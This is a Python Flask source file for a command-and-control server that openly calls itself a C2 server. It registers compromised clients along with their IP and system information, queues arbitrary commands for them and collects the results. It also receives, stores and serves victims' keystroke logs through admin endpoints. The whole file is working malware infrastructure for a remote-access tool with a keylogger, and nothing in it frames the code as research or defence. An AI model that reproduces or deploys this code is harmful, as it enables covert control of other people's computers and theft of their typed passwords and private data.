from flask import Flask, request, jsonify
import time
import threading
from datetime import datetime
import os
from config import ENCRYPTION_KEY
from encryptor import Encryptor
from protocol import Protocol
from database import DatabaseManager


app = Flask(__name__)

# Initialize database
db = DatabaseManager()

encryptor = Encryptor(ENCRYPTION_KEY)


def cleanup_old_data():
    """Nettoyage périodique des anciennes données"""
    while True:
        try:
            db.cleanup_old_data(days=30)
            print(f"[CLEANUP] Old data cleaned up")
            time.sleep(86400)  # Une fois par jour
        except Exception as e:
            print(f"[CLEANUP] Error: {e}")
            time.sleep(3600)

# Start cleanup thread
cleanup_thread = threading.Thread(target=cleanup_old_data, daemon=True)
cleanup_thread.start()


@app.route('/')
def home():
    return "C2 Server Online - " + datetime.now().isoformat()


@app.route('/register', methods=['POST'])
def register_client():
    try:
        encrypted_data = request.json.get('data')
        if not encrypted_data:
            error_msg = Protocol.create_error_message("No encrypted data provided!")

            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400
        


        client_data = encryptor.decrypt(encrypted_data)
        if not client_data:
            error_msg = Protocol.create_error_message("Decryption failed")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400
        


        if client_data.get("type") != Protocol.MSG_REGISTER:
            error_msg = Protocol.create_error_message("Invalid message type for registration")

            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400
        


        client_id = client_data.get("client_id")
        system_info = client_data.get("system_info", {})

        if not client_id:
            error_msg = Protocol.create_error_message("No client id in message")
            encrypted_res = encryptor.encrypt(error_msg)
            
            return jsonify({
                "data": encrypted_res
            }), 400
        

        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

        # Save to database
        db.get_or_create_client(client_id, system_info, client_ip)

        response_data = Protocol.create_success_message("Registered successfully!!!")
        encrypted_response = encryptor.encrypt(response_data)

        return jsonify({"data": encrypted_response})
    

    except Exception as e:
        print(f"REGISTRATION ERROR: {e}")
        error_msg = Protocol.create_error_message(str(e))
        error_res = encryptor.encrypt(error_msg)

        return jsonify({
            "data": error_res
        }), 500


@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    try:
        encrypted_data = request.json.get('data')
        if not encrypted_data:
            error_msg = Protocol.create_error_message("No encrypted data")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400



        heartbeat_data = encryptor.decrypt(encrypted_data)
        if not heartbeat_data:
            error_msg = Protocol.create_error_message("Decryption failed!")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400

        if heartbeat_data.get("type") != Protocol.MSG_HEARTBEAT:
            error_msg = Protocol.create_error_message("Invalid message type for heartbeat")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400



        client_id = heartbeat_data.get('client_id')

        if client_id:
            # Update heartbeat in database
            if db.update_client_heartbeat(client_id):
                res_msg = Protocol.create_success_message()
                encrypted_response = encryptor.encrypt(res_msg)
                return jsonify({
                    "data": encrypted_response
                })
            else:
                error_msg = Protocol.create_error_message("Client not found!")
                encrypted_response = encryptor.encrypt(error_msg)
                return jsonify({
                    "data": encrypted_response,
                }), 404
        else:
            error_msg = Protocol.create_error_message("No client_id provided!")
            encrypted_response = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_response,
            }), 400
    
    except Exception as e:
        error_msg = Protocol.create_error_message(str(e))
        encrypted_res = encryptor.encrypt(error_msg)

        return jsonify({
            "data": encrypted_res
        }), 500


@app.route('/admin/clients', methods=['GET'])
def get_clients():
    #Get list of all connected clients from database
    clients_list = db.get_all_clients()
    
    # Add uptime calculation
    current_time = time.time()
    for client in clients_list:
        if client.get('first_seen'):
            client['uptime_seconds'] = current_time - client['first_seen']
        else:
            client['uptime_seconds'] = 0
    
    print(f"[ADMIN] Returning {len(clients_list)} clients")
    return jsonify({
        "status": "success",
        "clients": clients_list,
        "total_clients": len(clients_list),
        "server_time": datetime.now().isoformat()
    })


@app.route('/admin/status', methods=['GET'])
def server_status():
    stats = db.get_statistics()
    
    return jsonify({
        "status": "online",
        "total_clients": stats['total_clients'],
        "online_clients": stats['online_clients'],
        "total_commands": stats['total_commands'],
        "pending_commands": stats['pending_commands'],
        "total_keylogs": stats['total_keylogs'],
        "total_events": stats['total_events'],
        "server_time": datetime.now().isoformat(),
        "uptime_seconds": time.time() - app.start_time
    })




@app.route("/admin/process/<client_id>", methods=['POST'])
def send_process_command(client_id):
    try:
        command_data = request.json
        action = command_data.get("action")
        data = command_data.get("data", {})
        
        if not action:
            return jsonify({"error": "No action specified"}), 400
        
        command_id = f'cmd_{int(time.time() * 1000)}'
        
        # Save command to database
        db.create_command(command_id, client_id, action, data)
        
        print(f"[PROCESS] Command queued for {client_id}: {action}")
        return jsonify({
            "success": True,
            "command_id": command_id,
            "message": f'Command queued for client {client_id}'
        })
    
    except Exception as e:
        return jsonify({"error": f"failed to queue command: {e}"}), 500
    


@app.route("/admin/command_result/<command_id>", methods=['GET'])
def get_command_result(command_id):
    try:
        result = db.get_command_result(command_id)
        if result and result.get('status') == 'completed':
            return jsonify({"success": True, "result": result.get('result')})
        else:
            return jsonify({"error": "Result not found or not yet completed"}), 404
    
    except Exception as e:
        return jsonify({"error": f'Failed to get result: {e}'}), 500


@app.route("/commands", methods=["POST"])
def get_commands():
    try:
        encrypted_data = request.json.get('data')
        if not encrypted_data:
            return jsonify({"error": "No encrypted data"}), 400
        
        
        client_data = encryptor.decrypt(encrypted_data)
        if not client_data or client_data.get("type") != Protocol.MSG_GET_COMMANDS:
            return jsonify({"error": "Invalid request"}), 400
        
        client_id = client_data.get("client_id")
        if not client_id:
            return jsonify({"error": "No client ID"}), 400
        
        
        print(f"[SERVER] Client {client_id} requesting commands")
        
        # Get pending commands from database
        commands_obj = db.get_pending_commands(client_id)
        commands = [{
            "command_id": cmd.command_id,
            "action": cmd.action,
            "data": cmd.data,
            "timestamp": cmd.created_at.timestamp() if cmd.created_at else time.time()
        } for cmd in commands_obj]
        
        print(f"[SERVER] Found {len(commands)} pending commands for {client_id}")
        print(f"[SERVER] Sending {len(commands)} commands to {client_id}")
        
        
        response_data = {
            "type": "commands",
            "commands": commands
        }
        
        
        encrypted_response = encryptor.encrypt(response_data)
        return jsonify({"data": encrypted_response})
    
    
    except Exception as e:
        print(f"[SERVER] Error in /commands: {e}")
        return jsonify({"error": f"Failed to get commands: {e}"}), 500
    
    


@app.route("/commands_result", methods=["POST"])
def submit_command_result():
    try:
        print(f"[SERVER] Received command result request")
        encrypted_data = request.json.get("data")
        if not encrypted_data:
            print(f"[SERVER] Error: No encrypted data in command result")
            return jsonify({"error": "No encrypted data"}), 400
        
        print(f"[SERVER] Decrypting command result...")
        client_data = encryptor.decrypt(encrypted_data)
        if not client_data:
            print(f"[SERVER] Error: Failed to decrypt command result")
            return jsonify({"error": "Decryption failed"}), 400
            
        print(f"[SERVER] Decrypted data type: {type(client_data)}")

        if not isinstance(client_data, dict) or client_data.get("type") != "command_result":
            print(f"[SERVER] Error: Invalid message format or type: {type(client_data)}")
            return jsonify({"error": "Invalid request format"}), 400
        
        command_id = client_data.get("command_id")
        result = client_data.get("result")
        
        print(f"[SERVER] Command ID: {command_id}, Result type: {type(result)}")
        
        if command_id and result is not None:
            # Update command result in database
            if db.update_command_result(command_id, result):
                print(f"[SERVER] Successfully stored result for command {command_id}")
                return jsonify({"success" : True})
            else:
                print(f"[SERVER] Error: Command {command_id} not found")
                return jsonify({"error": "Command not found"}), 404
        else:
            print(f"[SERVER] Error: Missing command_id or result")
            return jsonify({"error": "Missing command_id or result"}), 400
    
    except Exception as e:
        print(f"[SERVER] Error in /commands_result: {e}")
        import traceback
        print(f"[SERVER] Traceback: {traceback.format_exc()}")
        return jsonify({"error": f"Failed to submit result: {e}"}), 500


@app.route("/keylog_data", methods=["POST"])
def receive_keylog_data():
    
    try:
        print(f"[KEYLOG] Received keylog data request")
        encrypted_data = request.json.get("data")
        if not encrypted_data:
            print(f"[KEYLOG] Error: No encrypted data")
            return jsonify({"error": "No encrypted data"}), 400
        
        print(f"[KEYLOG] Decrypting keylog data...")
        keylog_data = encryptor.decrypt(encrypted_data)
        if not keylog_data:
            print(f"[KEYLOG] Error: Failed to decrypt keylog data")
            return jsonify({"error": "Decryption failed"}), 400
            
        print(f"[KEYLOG] Decrypted data type: {keylog_data.get('type')}")

        # Vérifier que c'est bien des keylogs
        if not isinstance(keylog_data, dict) or keylog_data.get("type") != "keylog_data":
            print(f"[KEYLOG] Error: Invalid message type: {keylog_data.get('type')}")
            return jsonify({"error": "Invalid keylog data format"}), 400
        
        client_id = keylog_data.get("client_id")
        logs = keylog_data.get("logs", [])
        log_count = keylog_data.get("log_count", 0)
        
        print(f"[KEYLOG] Client: {client_id}, Logs count: {log_count}")
        
        if client_id and logs:
            # Save to database
            db.save_keylogs(client_id, logs)
            
            # Update client last_seen
            db.update_client_heartbeat(client_id)
            
            total_logs = db.get_keylogs_count(client_id)
            
            print(f"[KEYLOG] ✅ Successfully stored {len(logs)} keylogs for client {client_id}")
            print(f"[KEYLOG] Total logs for {client_id}: {total_logs}")
            
            return jsonify({
                "success": True, 
                "message": f"Received {len(logs)} keylogs",
                "total_stored": total_logs
            })
        else:
            print(f"[KEYLOG] Error: Missing client_id or logs")
            return jsonify({"error": "Missing client_id or logs"}), 400
    
    except Exception as e:
        print(f"[KEYLOG] Error in /keylog_data: {e}")
        import traceback
        print(f"[KEYLOG] Traceback: {traceback.format_exc()}")
        return jsonify({"error": f"Failed to process keylogs: {e}"}), 500


@app.route("/admin/keylogs/<client_id>", methods=["GET"])
def get_client_keylogs(client_id):
    
    try:
        limit = request.args.get('limit', 100, type=int)
        
        # Get keylogs from database
        logs = db.get_keylogs(client_id, limit)
        total_count = db.get_keylogs_count(client_id)
        
        return jsonify({
            "success": True,
            "client_id": client_id,
            "keylogs": logs,
            "total_logs": total_count,
            "returned_logs": len(logs)
        })
    
    except Exception as e:
        print(f"[ADMIN_KEYLOG] Error getting keylogs for {client_id}: {e}")
        return jsonify({"error": f"Failed to get keylogs: {e}"}), 500
    

@app.route("/admin/keylogs_stats", methods=["GET"])
def get_keylogs_stats():
    
    try:
        clients = db.get_all_clients()
        stats = {}
        total_logs = 0
        
        for client in clients:
            client_id = client['client_id']
            log_count = db.get_keylogs_count(client_id)
            
            if log_count > 0:
                # Get last log timestamp
                logs = db.get_keylogs(client_id, limit=1)
                last_log_time = logs[0]['timestamp'] if logs else "No logs"
                
                stats[client_id] = {
                    "log_count": log_count,
                    "last_log_time": last_log_time,
                    "client_online": client.get('online', False)
                }
                total_logs += log_count
        
        return jsonify({
            "success": True,
            "total_clients_with_logs": len(stats),
            "total_logs_stored": total_logs,
            "clients": stats
        })
    
    except Exception as e:
        return jsonify({"error": f"Failed to get keylog stats: {e}"}), 500


# New admin routes for database insights
@app.route("/admin/events", methods=["GET"])
def get_events():
    try:
        client_id = request.args.get('client_id')
        event_type = request.args.get('event_type')
        limit = request.args.get('limit', 100, type=int)
        
        events = db.get_events(client_id=client_id, event_type=event_type, limit=limit)
        
        return jsonify({
            "success": True,
            "events": events,
            "total_returned": len(events)
        })
    except Exception as e:
        return jsonify({"error": f"Failed to get events: {e}"}), 500


@app.route("/admin/commands_history", methods=["GET"])
def get_commands_history():
    try:
        client_id = request.args.get('client_id')
        
        if client_id:
            # Get all commands for a specific client
            from database import Command
            commands = db.session.query(Command).filter_by(client_id=client_id).order_by(Command.created_at.desc()).limit(50).all()
        else:
            # Get recent commands for all clients
            from database import Command
            commands = db.session.query(Command).order_by(Command.created_at.desc()).limit(100).all()
        
        return jsonify({
            "success": True,
            "commands": [cmd.to_dict() for cmd in commands],
            "total_returned": len(commands)
        })
    except Exception as e:
        return jsonify({"error": f"Failed to get commands history: {e}"}), 500


@app.before_request
def before_request():
    stats = db.get_statistics()
    print(f"[REQUEST] {request.method} {request.path} - Online: {stats['online_clients']}/{stats['total_clients']}")

@app.after_request
def after_request(response):
    print(f"[RESPONSE] {request.method} {request.path} - Status: {response.status_code}")
    return response



#Store server start time
app.start_time = time.time()



if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"[SERVER] Starting C2 server on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)